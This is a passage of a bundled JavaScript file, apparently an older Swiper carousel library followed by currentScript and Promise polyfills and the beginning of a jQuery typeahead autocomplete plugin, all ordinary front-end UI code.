            y.callPlugins("onSwipeReset");
            var t = y.getWrapperTranslate()
              , i = $ * b.slidesPerGroup;
            if (m(),
            "auto" === b.slidesPerView) {
                for (var n = 0, a = 0; a < y.snapGrid.length; a++) {
                    if (-t === y.snapGrid[a])
                        return;
                    if (-t >= y.snapGrid[a] && -t < y.snapGrid[a + 1]) {
                        n = 0 < y.positions.diff ? -y.snapGrid[a + 1] : -y.snapGrid[a];
                        break
                    }
                }
                -t >= y.snapGrid[y.snapGrid.length - 1] && (n = -y.snapGrid[y.snapGrid.length - 1]),
                t <= -m() && (n = -m())
            } else
                n = t < 0 ? Math.round(t / i) * i : 0,
                t <= -m() && (n = -m());
            return (n = b.scrollContainer ? t < 0 ? t : 0 : n) < -m() && (n = -m()),
            (n = b.scrollContainer && $ < k ? 0 : n) !== t && (o(n, "reset", {
                runCallbacks: e
            }),
            !0)
        }
        ,
        y.swipeTo = function(e, t, i) {
            e = parseInt(e, 10),
            y.callPlugins("onSwipeTo", {
                index: e,
                speed: t
            }),
            b.loop && (e += y.loopedSlides);
            var n, a = y.getWrapperTranslate();
            if (!(!isFinite(e) || e > y.slides.length - 1 || e < 0))
                return (n = (n = "auto" === b.slidesPerView ? -y.slidesGrid[e] : -e * $) < -m() ? -m() : n) !== a && (o(n, "to", {
                    index: e,
                    speed: t,
                    runCallbacks: i = void 0 === i ? !0 : i
                }),
                !0)
        }
        ,
        y._queueStartCallbacks = !1,
        y._queueEndCallbacks = !1,
        y.updateActiveSlide = function(e) {
            if (y.initialized && 0 !== y.slides.length) {
                if (y.previousIndex = y.activeIndex,
                0 < (e = void 0 === e ? y.getWrapperTranslate() : e) && (e = 0),
                "auto" === b.slidesPerView) {
                    if (y.activeIndex = y.slidesGrid.indexOf(-e),
                    y.activeIndex < 0) {
                        for (a = 0; a < y.slidesGrid.length - 1 && !(-e > y.slidesGrid[a] && -e < y.slidesGrid[a + 1]); a++)
                            ;
                        var t = Math.abs(y.slidesGrid[a] + e)
                          , i = Math.abs(y.slidesGrid[a + 1] + e);
                        y.activeIndex = t <= i ? a : a + 1
                    }
                } else
                    y.activeIndex = Math[b.visibilityFullFit ? "ceil" : "round"](-e / $);
                if (y.activeIndex === y.slides.length && (y.activeIndex = y.slides.length - 1),
                y.activeIndex < 0 && (y.activeIndex = 0),
                y.slides[y.activeIndex]) {
                    if (y.calcVisibleSlides(e),
                    y.support.classList) {
                        for (var n, a = 0; a < y.slides.length; a++)
                            (n = y.slides[a]).classList.remove(b.slideActiveClass),
                            0 <= y.visibleSlides.indexOf(n) ? n.classList.add(b.slideVisibleClass) : n.classList.remove(b.slideVisibleClass);
                        y.slides[y.activeIndex].classList.add(b.slideActiveClass)
                    } else {
                        var o = new RegExp("\\s*" + b.slideActiveClass)
                          , s = new RegExp("\\s*" + b.slideVisibleClass);
                        for (a = 0; a < y.slides.length; a++)
                            y.slides[a].className = y.slides[a].className.replace(o, "").replace(s, ""),
                            0 <= y.visibleSlides.indexOf(y.slides[a]) && (y.slides[a].className += " " + b.slideVisibleClass);
                        y.slides[y.activeIndex].className += " " + b.slideActiveClass
                    }
                    b.loop ? (t = y.loopedSlides,
                    y.activeLoopIndex = y.activeIndex - t,
                    y.activeLoopIndex >= y.slides.length - 2 * t && (y.activeLoopIndex = y.slides.length - 2 * t - y.activeLoopIndex),
                    y.activeLoopIndex < 0 && (y.activeLoopIndex = y.slides.length - 2 * t + y.activeLoopIndex),
                    y.activeLoopIndex < 0 && (y.activeLoopIndex = 0)) : y.activeLoopIndex = y.activeIndex,
                    b.pagination && y.updatePagination(e)
                }
            }
        }
        ,
        y.createPagination = function(e) {
            if (b.paginationClickable && y.paginationButtons && q(),
            y.paginationContainer = b.pagination.nodeType ? b.pagination : r(b.pagination)[0],
            b.createPagination) {
                var t = ""
                  , i = y.slides.length;
                b.loop && (i -= 2 * y.loopedSlides);
                for (var n = 0; n < i; n++)
                    t += "<" + b.paginationElement + ' class="' + b.paginationElementClass + '"></' + b.paginationElement + ">";
                y.paginationContainer.innerHTML = t
            }
            if (y.paginationButtons = r("." + b.paginationElementClass, y.paginationContainer),
            e || y.updatePagination(),
            y.callPlugins("onCreatePagination"),
            b.paginationClickable) {
                var a = y.paginationButtons;
                if (a)
                    for (var o = 0; o < a.length; o++)
                        y.h.addEventListener(a[o], "click", V)
            }
        }
        ,
        y.updatePagination = function(e) {
            if (b.pagination && !(y.slides.length < 1) && r("." + b.paginationActiveClass, y.paginationContainer)) {
                var t = y.paginationButtons;
                if (0 !== t.length) {
                    for (var i = 0; i < t.length; i++)
                        t[i].className = b.paginationElementClass;
                    var n = b.loop ? y.loopedSlides : 0;
                    if (b.paginationAsRange) {
                        y.visibleSlides || y.calcVisibleSlides(e);
                        for (var a = [], o = 0; o < y.visibleSlides.length; o++) {
                            var s = y.slides.indexOf(y.visibleSlides[o]) - n;
                            b.loop && s < 0 && (s = y.slides.length - 2 * y.loopedSlides + s),
                            b.loop && s >= y.slides.length - 2 * y.loopedSlides && (s = y.slides.length - 2 * y.loopedSlides - s,
                            s = Math.abs(s)),
                            a.push(s)
                        }
                        for (o = 0; o < a.length; o++)
                            t[a[o]] && (t[a[o]].className += " " + b.paginationVisibleClass);
                        b.loop ? void 0 !== t[y.activeLoopIndex] && (t[y.activeLoopIndex].className += " " + b.paginationActiveClass) : t[y.activeIndex] && (t[y.activeIndex].className += " " + b.paginationActiveClass)
                    } else
                        b.loop ? t[y.activeLoopIndex] && (t[y.activeLoopIndex].className += " " + b.paginationActiveClass + " " + b.paginationVisibleClass) : t[y.activeIndex] && (t[y.activeIndex].className += " " + b.paginationActiveClass + " " + b.paginationVisibleClass)
                }
            }
        }
        ,
        y.calcVisibleSlides = function(e) {
            var t = []
              , i = 0
              , n = 0;
            C && 0 < y.wrapperLeft && (e += y.wrapperLeft),
            !C && 0 < y.wrapperTop && (e += y.wrapperTop);
            for (var a = 0; a < y.slides.length; a++) {
                var o = (i += n) + (n = "auto" === b.slidesPerView ? C ? y.h.getWidth(y.slides[a], !0, b.roundLengths) : y.h.getHeight(y.slides[a], !0, b.roundLengths) : $)
                  , s = !1;
                b.visibilityFullFit ? (-e <= i && o <= -e + k && (s = !0),
                i <= -e && -e + k <= o && (s = !0)) : (-e < o && o <= -e + k && (s = !0),
                -e <= i && i < -e + k && (s = !0),
                i < -e && -e + k < o && (s = !0)),
                s && t.push(y.slides[a])
            }
            0 === t.length && (t = [y.slides[y.activeIndex]]),
            y.visibleSlides = t
        }
        ,
        y.startAutoplay = function() {
            if (y.support.transitions) {
                if (void 0 !== z)
                    return !1;
                b.autoplay && (y.callPlugins("onAutoplayStart"),
                b.onAutoplayStart && y.fireCallback(b.onAutoplayStart, y),
                t())
            } else {
                if (void 0 !== L)
                    return !1;
                b.autoplay && (y.callPlugins("onAutoplayStart"),
                b.onAutoplayStart && y.fireCallback(b.onAutoplayStart, y),
                L = setInterval(function() {
                    b.loop ? (y.fixLoop(),
                    y.swipeNext(!0, !0)) : y.swipeNext(!0, !0) || (b.autoplayStopOnLast ? (clearInterval(L),
                    L = void 0) : y.swipeTo(0))
                }, b.autoplay))
            }
        }
        ,
        y.stopAutoplay = function(e) {
            y.support.transitions ? z && (z && clearTimeout(z),
            z = void 0,
            e && !b.autoplayDisableOnInteraction && y.wrapperTransitionEnd(function() {
                t()
            }),
            y.callPlugins("onAutoplayStop"),
            b.onAutoplayStop && y.fireCallback(b.onAutoplayStop, y)) : (L && clearInterval(L),
            L = void 0,
            y.callPlugins("onAutoplayStop"),
            b.onAutoplayStop && y.fireCallback(b.onAutoplayStop, y))
        }
        ,
        y.loopCreated = !1,
        y.removeLoopedSlides = function() {
            if (y.loopCreated)
                for (var e = 0; e < y.slides.length; e++)
                    !0 === y.slides[e].getData("looped") && y.wrapper.removeChild(y.slides[e])
        }
        ,
        y.createLoop = function() {
            if (0 !== y.slides.length) {
                y.loopedSlides = "auto" === b.slidesPerView ? b.loopedSlides || 1 : Math.floor(b.slidesPerView) + b.loopAdditionalSlides,
                y.loopedSlides > y.slides.length && (y.loopedSlides = y.slides.length);
                for (var e = "", t = "", i = "", n = y.slides.length, a = Math.floor(y.loopedSlides / n), o = y.loopedSlides % n, s = 0; s < a * n; s++) {
                    var r = s;
                    n <= s && (r = s - n * Math.floor(s / n)),
                    i += y.slides[r].outerHTML
                }
                for (s = 0; s < o; s++)
                    t += F(b.slideDuplicateClass, y.slides[s].outerHTML);
                for (s = n - o; s < n; s++)
                    e += F(b.slideDuplicateClass, y.slides[s].outerHTML);
                var c = e + i + u.innerHTML + i + t;
                for (u.innerHTML = c,
                y.loopCreated = !0,
                y.calcSlides(),
                s = 0; s < y.slides.length; s++)
                    (s < y.loopedSlides || s >= y.slides.length - y.loopedSlides) && y.slides[s].setData("looped", !0);
                y.callPlugins("onCreateLoop")
            }
        }
        ,
        y.fixLoop = function() {
            var e;
            y.activeIndex < y.loopedSlides ? (e = y.slides.length - 3 * y.loopedSlides + y.activeIndex,
            y.swipeTo(e, 0, !1)) : ("auto" === b.slidesPerView && y.activeIndex >= 2 * y.loopedSlides || y.activeIndex > y.slides.length - 2 * b.slidesPerView) && (e = -y.slides.length + y.activeIndex + y.loopedSlides,
            y.swipeTo(e, 0, !1))
        }
        ,
        y.loadSlides = function() {
            var e = "";
            y.activeLoaderIndex = 0;
            for (var t = b.loader.slides, i = b.loader.loadAllSlides ? t.length : b.slidesPerView * (1 + b.loader.surroundGroups), n = 0; n < i; n++)
                e += "outer" === b.loader.slidesHTMLType ? t[n] : "<" + b.slideElement + ' class="' + b.slideClass + '" data-swiperindex="' + n + '">' + t[n] + "</" + b.slideElement + ">";
            y.wrapper.innerHTML = e,
            y.calcSlides(!0),
            b.loader.loadAllSlides || y.wrapperTransitionEnd(y.reloadSlides, !0)
        }
        ,
        y.reloadSlides = function() {
            var e = b.loader.slides
              , t = parseInt(y.activeSlide().data("swiperindex"), 10);
            if (!(t < 0 || t > e.length - 1)) {
                y.activeLoaderIndex = t;
                var i = Math.max(0, t - b.slidesPerView * b.loader.surroundGroups)
                  , n = Math.min(t + b.slidesPerView * (1 + b.loader.surroundGroups) - 1, e.length - 1);
                if (0 < t && (t = -$ * (t - i),
                y.setWrapperTranslate(t),
                y.setWrapperTransition(0)),
                "reload" === b.loader.logic) {
                    for (var a = y.wrapper.innerHTML = "", o = i; o <= n; o++)
                        a += "outer" === b.loader.slidesHTMLType ? e[o] : "<" + b.slideElement + ' class="' + b.slideClass + '" data-swiperindex="' + o + '">' + e[o] + "</" + b.slideElement + ">";
                    y.wrapper.innerHTML = a
                } else {
                    var s, r = 1e3, c = 0;
                    for (o = 0; o < y.slides.length; o++) {
                        var l = y.slides[o].data("swiperindex");
                        l < i || n < l ? y.wrapper.removeChild(y.slides[o]) : (r = Math.min(l, r),
                        c = Math.max(l, c))
                    }
                    for (o = i; o <= n; o++)
                        o < r && ((s = document.createElement(b.slideElement)).className = b.slideClass,
                        s.setAttribute("data-swiperindex", o),
                        s.innerHTML = e[o],
                        y.wrapper.insertBefore(s, y.wrapper.firstChild)),
                        c < o && ((s = document.createElement(b.slideElement)).className = b.slideClass,
                        s.setAttribute("data-swiperindex", o),
                        s.innerHTML = e[o],
                        y.wrapper.appendChild(s))
                }
                y.reInit(!0)
            }
        }
        ,
        y.calcSlides(),
        0 < b.loader.slides.length && 0 === y.slides.length && y.loadSlides(),
        b.loop && y.createLoop(),
        y.init(),
        P(),
        b.pagination && y.createPagination(!0),
        b.loop || 0 < b.initialSlide ? y.swipeTo(b.initialSlide, 0, !1) : y.updateActiveSlide(0),
        b.autoplay && y.startAutoplay(),
        y.centerIndex = y.activeIndex,
        b.onSwiperCreated && y.fireCallback(b.onSwiperCreated, y),
        y.callPlugins("onSwiperCreated")
    }
}
)
  , isEmpty = (Swiper.prototype = {
    plugins: {},
    wrapperTransitionEnd: function(t, i) {
        "use strict";
        function n(e) {
            if (e.target === s && (t(o),
            o.params.queueEndCallbacks && (o._queueEndCallbacks = !1),
            !i))
                for (a = 0; a < r.length; a++)
                    o.h.removeEventListener(s, r[a], n)
        }
        var a, o = this, s = o.wrapper, r = ["webkitTransitionEnd", "transitionend", "oTransitionEnd", "MSTransitionEnd", "msTransitionEnd"];
        if (t)
            for (a = 0; a < r.length; a++)
                o.h.addEventListener(s, r[a], n)
    },
    getWrapperTranslate: function(e) {
        "use strict";
        var t, i, n, a, o = this.wrapper;
        return void 0 === e && (e = "horizontal" === this.params.mode ? "x" : "y"),
        this.support.transforms && this.params.useCSS3Transforms ? (n = window.getComputedStyle(o, null),
        window.WebKitCSSMatrix ? a = new WebKitCSSMatrix("none" === n.webkitTransform ? "" : n.webkitTransform) : t = (a = n.MozTransform || n.OTransform || n.MsTransform || n.msTransform || n.transform || n.getPropertyValue("transform").replace("translate(", "matrix(1, 0, 0, 1,")).toString().split(","),
        "x" === e && (i = window.WebKitCSSMatrix ? a.m41 : parseFloat(16 === t.length ? t[12] : t[4])),
        "y" === e && (i = window.WebKitCSSMatrix ? a.m42 : parseFloat(16 === t.length ? t[13] : t[5]))) : ("x" === e && (i = parseFloat(o.style.left, 10) || 0),
        "y" === e && (i = parseFloat(o.style.top, 10) || 0)),
        i || 0
    },
    setWrapperTranslate: function(e, t, i) {
        "use strict";
        var n = this.wrapper.style
          , a = {
            x: 0,
            y: 0,
            z: 0
        };
        3 === arguments.length ? (a.x = e,
        a.y = t,
        a.z = i) : a[t = void 0 === t ? "horizontal" === this.params.mode ? "x" : "y" : t] = e,
        this.support.transforms && this.params.useCSS3Transforms ? (i = this.support.transforms3d ? "translate3d(" + a.x + "px, " + a.y + "px, " + a.z + "px)" : "translate(" + a.x + "px, " + a.y + "px)",
        n.webkitTransform = n.MsTransform = n.msTransform = n.MozTransform = n.OTransform = n.transform = i) : (n.left = a.x + "px",
        n.top = a.y + "px"),
        this.callPlugins("onSetWrapperTransform", a),
        this.params.onSetWrapperTransform && this.fireCallback(this.params.onSetWrapperTransform, this, a)
    },
    setWrapperTransition: function(e) {
        "use strict";
        var t = this.wrapper.style;
        t.webkitTransitionDuration = t.MsTransitionDuration = t.msTransitionDuration = t.MozTransitionDuration = t.OTransitionDuration = t.transitionDuration = e / 1e3 + "s",
        this.callPlugins("onSetWrapperTransition", {
            duration: e
        }),
        this.params.onSetWrapperTransition && this.fireCallback(this.params.onSetWrapperTransition, this, e)
    },
    h: {
        getWidth: function(e, t, i) {
            "use strict";
            var n = window.getComputedStyle(e, null).getPropertyValue("width")
              , a = parseFloat(n);
            return (isNaN(a) || 0 < n.indexOf("%") || a < 0) && (a = e.offsetWidth - parseFloat(window.getComputedStyle(e, null).getPropertyValue("padding-left")) - parseFloat(window.getComputedStyle(e, null).getPropertyValue("padding-right"))),
            t && (a += parseFloat(window.getComputedStyle(e, null).getPropertyValue("padding-left")) + parseFloat(window.getComputedStyle(e, null).getPropertyValue("padding-right"))),
            i ? Math.ceil(a) : a
        },
        getHeight: function(e, t, i) {
            "use strict";
            if (t)
                return e.offsetHeight;
            var n = window.getComputedStyle(e, null).getPropertyValue("height")
              , a = parseFloat(n);
            return (isNaN(a) || 0 < n.indexOf("%") || a < 0) && (a = e.offsetHeight - parseFloat(window.getComputedStyle(e, null).getPropertyValue("padding-top")) - parseFloat(window.getComputedStyle(e, null).getPropertyValue("padding-bottom"))),
            t && (a += parseFloat(window.getComputedStyle(e, null).getPropertyValue("padding-top")) + parseFloat(window.getComputedStyle(e, null).getPropertyValue("padding-bottom"))),
            i ? Math.ceil(a) : a
        },
        getOffset: function(e) {
            "use strict";
            var t = e.getBoundingClientRect()
              , i = document.body
              , n = e.clientTop || i.clientTop || 0
              , i = e.clientLeft || i.clientLeft || 0
              , a = window.pageYOffset || e.scrollTop
              , e = window.pageXOffset || e.scrollLeft;
            return document.documentElement && !window.pageYOffset && (a = document.documentElement.scrollTop,
            e = document.documentElement.scrollLeft),
            {
                top: t.top + a - n,
                left: t.left + e - i
            }
        },
        windowWidth: function() {
            "use strict";
            return window.innerWidth || (document.documentElement && document.documentElement.clientWidth ? document.documentElement.clientWidth : void 0)
        },
        windowHeight: function() {
            "use strict";
            return window.innerHeight || (document.documentElement && document.documentElement.clientHeight ? document.documentElement.clientHeight : void 0)
        },
        windowScroll: function() {
            "use strict";
            return "undefined" != typeof pageYOffset ? {
                left: window.pageXOffset,
                top: window.pageYOffset
            } : document.documentElement ? {
                left: document.documentElement.scrollLeft,
                top: document.documentElement.scrollTop
            } : void 0
        },
        addEventListener: function(e, t, i, n) {
            "use strict";
            void 0 === n && (n = !1),
            e.addEventListener ? e.addEventListener(t, i, n) : e.attachEvent && e.attachEvent("on" + t, i)
        },
        removeEventListener: function(e, t, i, n) {
            "use strict";
            void 0 === n && (n = !1),
            e.removeEventListener ? e.removeEventListener(t, i, n) : e.detachEvent && e.detachEvent("on" + t, i)
        }
    },
    setTransform: function(e, t) {
        "use strict";
        e = e.style;
        e.webkitTransform = e.MsTransform = e.msTransform = e.MozTransform = e.OTransform = e.transform = t
    },
    setTranslate: function(e, t) {
        "use strict";
        var e = e.style
          , i = t.x || 0
          , n = t.y || 0
          , t = t.z || 0
          , t = this.support.transforms3d ? "translate3d(" + i + "px," + n + "px," + t + "px)" : "translate(" + i + "px," + n + "px)";
        e.webkitTransform = e.MsTransform = e.msTransform = e.MozTransform = e.OTransform = e.transform = t,
        this.support.transforms || (e.left = i + "px",
        e.top = n + "px")
    },
    setTransition: function(e, t) {
        "use strict";
        e = e.style;
        e.webkitTransitionDuration = e.MsTransitionDuration = e.msTransitionDuration = e.MozTransitionDuration = e.OTransitionDuration = e.transitionDuration = t + "ms"
    },
    support: {
        touch: window.Modernizr && !0 === Modernizr.touch || function() {
            "use strict";
            return !!("ontouchstart"in window || window.DocumentTouch && document instanceof DocumentTouch)
        }(),
        transforms3d: window.Modernizr && !0 === Modernizr.csstransforms3d || function() {
            "use strict";
            var e = document.createElement("div").style;
            return "webkitPerspective"in e || "MozPerspective"in e || "OPerspective"in e || "MsPerspective"in e || "perspective"in e
        }(),
        transforms: window.Modernizr && !0 === Modernizr.csstransforms || function() {
            "use strict";
            var e = document.createElement("div").style;
            return "transform"in e || "WebkitTransform"in e || "MozTransform"in e || "msTransform"in e || "MsTransform"in e || "OTransform"in e
        }(),
        transitions: window.Modernizr && !0 === Modernizr.csstransitions || function() {
            "use strict";
            var e = document.createElement("div").style;
            return "transition"in e || "WebkitTransition"in e || "MozTransition"in e || "msTransition"in e || "MsTransition"in e || "OTransition"in e
        }(),
        classList: function() {
            "use strict";
            return "classList"in document.createElement("div")
        }()
    },
    browser: {
        ie8: function() {
            "use strict";
            var e, t = -1;
            return "Microsoft Internet Explorer" === navigator.appName && (e = navigator.userAgent,
            null !== new RegExp(/MSIE ([0-9]{1,}[\.0-9]{0,})/).exec(e) && (t = parseFloat(RegExp.$1))),
            -1 !== t && t < 9
        }(),
        ie10: window.navigator.msPointerEnabled,
        ie11: window.navigator.pointerEnabled
    }
},
(window.jQuery || window.Zepto) && function(o) {
    "use strict";
    o.fn.swiper = function(n) {
        var a;
        return this.each(function(e) {
            var t = o(this)
              , i = new Swiper(t[0],n);
            e || (a = i),
            t.data("swiper", i)
        }),
        a
    }
}(window.jQuery || window.Zepto),
"undefined" != typeof module ? module.exports = Swiper : "function" == typeof define && define.amd && define([], function() {
    "use strict";
    return Swiper
}),
!function(e) {
    var t = "currentScript"
      , n = e.getElementsByTagName("script");
    t in e || Object.defineProperty(e, t, {
        get: function() {
            try {
                throw new Error
            } catch (e) {
                var t, i = (/.*at [^\(]*\((.*):.+:.+\)$/gi.exec(e.stack) || [!1])[1];
                for (t in n)
                    if (n[t].src == i || "interactive" == n[t].readyState)
                        return n[t];
                return null
            }
        }
    })
}(document),
!function(e) {
    ("object" != typeof exports || "undefined" == typeof module) && "function" == typeof define && define.amd ? define(e) : e()
}(function() {
    "use strict";
    function e(t) {
        var i = this.constructor;
        return this.then(function(e) {
            return i.resolve(t()).then(function() {
                return e
            })
        }, function(e) {
            return i.resolve(t()).then(function() {
                return i.reject(e)
            })
        })
    }
    function t(i) {
        return new this(function(a, e) {
            if (!i || void 0 === i.length)
                return e(new TypeError(typeof i + " " + i + " is not iterable(cannot read property Symbol(Symbol.iterator))"));
            var o = Array.prototype.slice.call(i);
            if (0 === o.length)
                return a([]);
            for (var s = o.length, t = 0; o.length > t; t++)
                !function t(i, e) {
                    if (e && ("object" == typeof e || "function" == typeof e)) {
                        var n = e.then;
                        if ("function" == typeof n)
                            return n.call(e, function(e) {
                                t(i, e)
                            }, function(e) {
                                o[i] = {
                                    status: "rejected",
                                    reason: e
                                },
                                0 == --s && a(o)
                            })
                    }
                    o[i] = {
                        status: "fulfilled",
                        value: e
                    },
                    0 == --s && a(o)
                }(t, o[t])
        }
        )
    }
    function r(e, t) {
        this.name = "AggregateError",
        this.errors = e,
        this.message = t || ""
    }
    function i(o) {
        var s = this;
        return new s(function(e, t) {
            if (!o || void 0 === o.length)
                return t(new TypeError("Promise.any accepts an array"));
            var i = Array.prototype.slice.call(o);
            if (0 === i.length)
                return t();
            for (var n = [], a = 0; i.length > a; a++)
                try {
                    s.resolve(i[a]).then(e).catch(function(e) {
                        n.push(e),
                        n.length === i.length && t(new r(n,"All promises were rejected"))
                    })
                } catch (e) {
                    t(e)
                }
        }
        )
    }
    function c(e) {
        return e && void 0 !== e.length
    }
    function a() {}
    function o(e) {
        if (!(this instanceof o))
            throw new TypeError("Promises must be constructed via new");
        if ("function" != typeof e)
            throw new TypeError("not a function");
        this._state = 0,
        this._handled = !1,
        this._value = void 0,
        this._deferreds = [],
        u(e, this)
    }
    function s(i, n) {
        for (; 3 === i._state; )
            i = i._value;
        0 !== i._state ? (i._handled = !0,
        o._immediateFn(function() {
            var e, t = 1 === i._state ? n.onFulfilled : n.onRejected;
            if (null !== t) {
                try {
                    e = t(i._value)
                } catch (e) {
                    return void d(n.promise, e)
                }
                l(n.promise, e)
            } else
                (1 === i._state ? l : d)(n.promise, i._value)
        })) : i._deferreds.push(n)
    }
    function l(t, e) {
        try {
            if (e === t)
                throw new TypeError("A promise cannot be resolved with itself.");
            if (e && ("object" == typeof e || "function" == typeof e)) {
                var i = e.then;
                if (e instanceof o)
                    return t._state = 3,
                    t._value = e,
                    p(t);
                if ("function" == typeof i)
                    return u((n = i,
                    a = e,
                    function() {
                        n.apply(a, arguments)
                    }
                    ), t)
            }
            t._state = 1,
            t._value = e,
            p(t)
        } catch (e) {
            d(t, e)
        }
        var n, a
    }
    function d(e, t) {
        e._state = 2,
        e._value = t,
        p(e)
    }
    function p(e) {
        2 === e._state && 0 === e._deferreds.length && o._immediateFn(function() {
            e._handled || o._unhandledRejectionFn(e._value)
        });
        for (var t = 0, i = e._deferreds.length; t < i; t++)
            s(e, e._deferreds[t]);
        e._deferreds = null
    }
    function u(e, t) {
        var i = !1;
        try {
            e(function(e) {
                i || (i = !0,
                l(t, e))
            }, function(e) {
                i || (i = !0,
                d(t, e))
            })
        } catch (e) {
            i || (i = !0,
            d(t, e))
        }
    }
    r.prototype = Error.prototype;
    var n = setTimeout
      , h = (o.prototype.catch = function(e) {
        return this.then(null, e)
    }
    ,
    o.prototype.then = function(n, e) {
        var t = new this.constructor(a);
        return s(this, new function(e, t, i) {
            this.onFulfilled = "function" == typeof n ? n : null,
            this.onRejected = "function" == typeof t ? t : null,
            this.promise = i
        }
        (0,e,t)),
        t
    }
    ,
    o.prototype.finally = e,
    o.all = function(t) {
        return new o(function(a, o) {
            if (!c(t))
                return o(new TypeError("Promise.all accepts an array"));
            var s = Array.prototype.slice.call(t);
            if (0 === s.length)
                return a([]);
            for (var r = s.length, e = 0; s.length > e; e++)
                !function t(i, e) {
                    try {
                        if (e && ("object" == typeof e || "function" == typeof e)) {
                            var n = e.then;
                            if ("function" == typeof n)
                                return n.call(e, function(e) {
                                    t(i, e)
                                }, o)
                        }
                        s[i] = e,
                        0 == --r && a(s)
                    } catch (e) {
                        o(e)
                    }
                }(e, s[e])
        }
        )
    }
    ,
    o.any = i,
    o.allSettled = t,
    o.resolve = function(t) {
        return t && "object" == typeof t && t.constructor === o ? t : new o(function(e) {
            e(t)
        }
        )
    }
    ,
    o.reject = function(i) {
        return new o(function(e, t) {
            t(i)
        }
        )
    }
    ,
    o.race = function(a) {
        return new o(function(e, t) {
            if (!c(a))
                return t(new TypeError("Promise.race accepts an array"));
            for (var i = 0, n = a.length; i < n; i++)
                o.resolve(a[i]).then(e, t)
        }
        )
    }
    ,
    o._immediateFn = "function" == typeof setImmediate ? function(e) {
        setImmediate(e)
    }
    : function(e) {
        n(e, 0)
    }
    ,
    o._unhandledRejectionFn = function(e) {
        void 0 !== console && console && console.warn("Possible Unhandled Promise Rejection:", e)
    }
    ,
    function() {
        if ("undefined" != typeof self)
            return self;
        if ("undefined" != typeof window)
            return window;
        if ("undefined" != typeof global)
            return global;
        throw Error("unable to locate global object")
    }());
    "function" != typeof h.Promise ? h.Promise = o : (h.Promise.prototype.finally || (h.Promise.prototype.finally = e),
    h.Promise.allSettled || (h.Promise.allSettled = t),
    h.Promise.any || (h.Promise.any = i))
}),
!function(e, t) {
    "use strict";
    "undefined" != typeof module && module.exports ? module.exports = t(require("jquery")) : "function" == typeof define && define.amd ? define(["jquery"], t) : t(e.jQuery)
}(this, function(c) {
    "use strict";
    function a(e, t) {
        this.$element = c(e),
        this.options = c.extend({}, a.defaults, t),
        this.matcher = this.options.matcher || this.matcher,
        this.sorter = this.options.sorter || this.sorter,
        this.select = this.options.select || this.select,
        this.autoSelect = "boolean" != typeof this.options.autoSelect || this.options.autoSelect,
        this.highlighter = this.options.highlighter || this.highlighter,
        this.render = this.options.render || this.render,
        this.updater = this.options.updater || this.updater,
        this.displayText = this.options.displayText || this.displayText,
        this.source = this.options.source,
        this.delay = this.options.delay,
        this.$menu = c(this.options.menu),
        this.$appendTo = this.options.appendTo ? c(this.options.appendTo) : null,
        this.fitToElement = "boolean" == typeof this.options.fitToElement && this.options.fitToElement,
        this.shown = !1,
        this.listen(),
        this.showHintOnFocus = ("boolean" == typeof this.options.showHintOnFocus || "all" === this.options.showHintOnFocus) && this.options.showHintOnFocus,
        this.afterSelect = this.options.afterSelect,
        this.addItem = !1,
        this.emptyItem = !1,
        this.value = this.$element.val() || this.$element.text(),
        this.keyPressed = !1
    }
    a.prototype = {
        constructor: a,
        select: function() {
            var e = this.$menu.find(".active").data("value");
            return this.$element.data("active", e),
            (this.autoSelect || e) && (e = (e = this.updater(e)) || "",
            this.$element.val(this.displayText(e) || e).text(this.displayText(e) || e).change(),
            this.afterSelect(e)),
            this.hide()
        },
        updater: function(e) {
            return e
        },
        setSource: function(e) {
            this.source = e
        },
        show: function() {
            var e, t = c.extend({}, this.$element.position(), {
                height: this.$element[0].offsetHeight
            }), i = "function" == typeof this.options.scrollHeight ? this.options.scrollHeight.call() : this.options.scrollHeight;
            this.shown ? e = this.$menu : this.$appendTo ? (e = this.$menu.appendTo(this.$appendTo),
            this.hasSameParent = this.$appendTo.is(this.$element.parent())) : (e = this.$menu.insertAfter(this.$element),
            this.hasSameParent = !0);
            c(e).parent().hasClass("dropup") || (t.top,
            t.height),
            c(e).hasClass("dropdown-menu-right") || t.left;
            return e.show(),
            !0 === this.options.fitToElement && e.css("width", this.$element.outerWidth() + "px"),
            this.shown = !0,
            this
        },
        hide: function() {
            return this.$menu.hide(),
            this.shown = !1,
            this
        },
        lookup: function(e) {
            if (this.query = null != e ? e : this.$element.val() || this.$element.text() || "",
            this.query.length < this.options.minLength && !this.options.showHintOnFocus)
                return this.shown ? this.hide() : this;
            e = c.proxy(function() {
                c.isFunction(this.source) && 3 === this.source.length ? this.source(this.query, c.proxy(this.process, this), c.proxy(this.process, this)) : c.isFunction(this.source) ? this.source(this.query, c.proxy(this.process, this)) : this.source && this.process(this.source)
            }, this);
            clearTimeout(this.lookupWorker),
            this.lookupWorker = setTimeout(e, this.delay)
        },
        process: function(e) {
            var t = this;
            return e = c.grep(e, function(e) {
                return void 0 !== e && t.matcher(e)
            }),
            (e = this.sorter(e)).length || this.options.addItem || this.options.emptyItem ? (0 < e.length ? this.$element.data("active", e[0]) : (this.$element.data("active", null),
            this.options.emptyItem && (e.push(t.query),
            this.map[e[0]] = e[0])),
            "all" != this.options.items && (e = e.slice(0, this.options.items)),
            this.options.addItem && e.push(this.options.addItem),
            this.render(e).show()) : this.shown ? this.hide() : this
        },
        matcher: function(e) {
            return ~this.displayText(e).toLowerCase().indexOf(this.query.toLowerCase())
        },
        sorter: function(e) {
            for (var t, i = [], n = [], a = []; t = e.shift(); ) {
                var o = this.displayText(t);
                (o.toLowerCase().indexOf(this.query.toLowerCase()) ? ~o.indexOf(this.query) ? n : a : i).push(t)
            }
            return i.concat(n, a)
        },
        highlighter: function(e) {
            var t = this.query;
            if ("" !== t) {
                var i = e.match(/(>)([^<]*)(<)/g)
                  , n = []
                  , a = [];
                if (i && i.length)
                    for (r = 0; r < i.length; ++r)
                        2 < i[r].length && n.push(i[r]);
                else
                    (n = []).push(e);
                for (var o, t = t.replace(/[\(\)\/\.\*\+\?\[\]]/g, function(e) {
                    return "\\" + e
                }), s = new RegExp(t,"g"), r = 0; r < n.length; ++r)
                    (o = n[r].match(s)) && 0 < o.length && a.push(n[r]);
                for (r = 0; r < a.length; ++r)
                    e = e.replace(a[r], a[r].replace(s, "<strong>$&</strong>"))
            }
            return e
        },
        render: function(i) {
            var n = this
              , a = this
              , o = !1
              , s = []
              , r = n.options.separator;
            return c.each(i, function(e, t) {
                0 < e && t[r] !== i[e - 1][r] && s.push({
                    __type: "divider"
                }),
                !t[r] || 0 !== e && t[r] === i[e - 1][r] || s.push({
                    __type: "category",
                    name: t[r]
                }),
                s.push(t)
